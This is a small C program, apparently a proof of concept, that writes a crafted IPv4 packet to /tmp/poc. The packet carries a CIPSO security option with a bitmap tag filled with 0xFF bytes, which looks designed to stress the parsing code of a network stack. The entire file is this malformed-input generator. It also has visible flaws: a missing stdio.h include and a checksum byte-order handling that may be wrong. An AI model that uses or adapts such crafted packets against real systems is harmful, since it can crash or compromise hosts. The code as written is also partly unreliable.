#include <stdlib.h>
#include <string.h>
#include <stdint.h>

static uint16_t csum(uint16_t *p, int n) {
    uint32_t s = 0;
    while (n > 1) { s += *p++; n -= 2; }
    if (n) s += *(uint8_t*)p;
    while (s >> 16) s = (s & 0xffff) + (s >> 16);
    return ~s;
}

int main(void) {
    FILE *f = fopen("/tmp/poc", "wb");
    if (!f) return 1;

    uint8_t pkt[128];
    memset(pkt, 0, sizeof(pkt));

    pkt[0] = 0x4F;              /* v4, IHL=15 -> 60 bytes */
    pkt[1] = 0;
    uint16_t totlen = 60;
    pkt[2] = totlen >> 8; pkt[3] = totlen & 0xff;
    pkt[4] = 0; pkt[5] = 0;
    pkt[6] = 0x40; pkt[7] = 0;
    pkt[8] = 64;
    pkt[9] = 253;               /* experimental protocol */
    pkt[12]=10; pkt[13]=0; pkt[14]=0; pkt[15]=1;
    pkt[16]=10; pkt[17]=0; pkt[18]=0; pkt[19]=2;

    int o = 20;
    pkt[o+0] = 0x86;            /* IPOPT_CIPSO */
    pkt[o+1] = 40;
    pkt[o+2]=0; pkt[o+3]=0; pkt[o+4]=0; pkt[o+5]=1;  /* DOI */
    pkt[o+6] = 1;               /* tagtype=bitmap */
    pkt[o+7] = 34;              /* taglen=34 */
    pkt[o+8] = 0;
    pkt[o+9] = 0;
    for (int i = 0; i < 30; i++)
        pkt[o+10+i] = 0xFF;

    pkt[10]=0; pkt[11]=0;
    uint16_t cs = csum((uint16_t*)pkt, 60);
    pkt[10] = cs >> 8; pkt[11] = cs & 0xff;

    fwrite(pkt, 1, 60, f);
    fclose(f);
    return 0;
}

